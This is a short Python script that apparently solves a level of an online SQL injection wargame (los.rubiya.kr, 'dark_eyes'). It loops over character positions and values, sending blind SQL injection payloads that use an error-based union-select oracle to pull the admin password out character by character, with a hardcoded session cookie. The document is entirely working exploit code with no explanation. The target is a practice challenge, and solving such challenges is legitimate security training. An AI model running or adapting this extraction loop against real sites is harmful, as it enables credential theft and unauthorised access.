import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="
session = {'PHPSESSID':'1pnndupij0939bhhc7o1etb71b'}
payload2 = ""


for i in range(1,9):
    for j in range(48,123):
        payload="' or id='admin' and (ord(substr(pw,"+str(i)+",1))="+str(j)+" or (select 1 union select pw))%23"
        #print(str(i)+" payload = "+url+payload)
        
        request = requests.post(url+payload, cookies=session)
        if "select" in request.text:
            flag = 0
            break
        else:
            flag = 1
            continue
    payload2 = payload2 + chr(j)
    print(payload2)
print("DONE!!"+payload2)

